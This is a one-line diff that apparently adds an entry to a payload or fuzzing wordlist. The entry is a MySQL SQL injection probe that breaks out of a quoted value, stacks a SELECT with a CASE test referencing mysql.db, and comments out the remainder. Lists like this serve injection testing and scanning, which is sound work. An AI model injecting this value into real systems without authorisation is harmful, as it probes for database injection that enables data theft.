@@ -1,0 +1,1 @@
+1";select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#
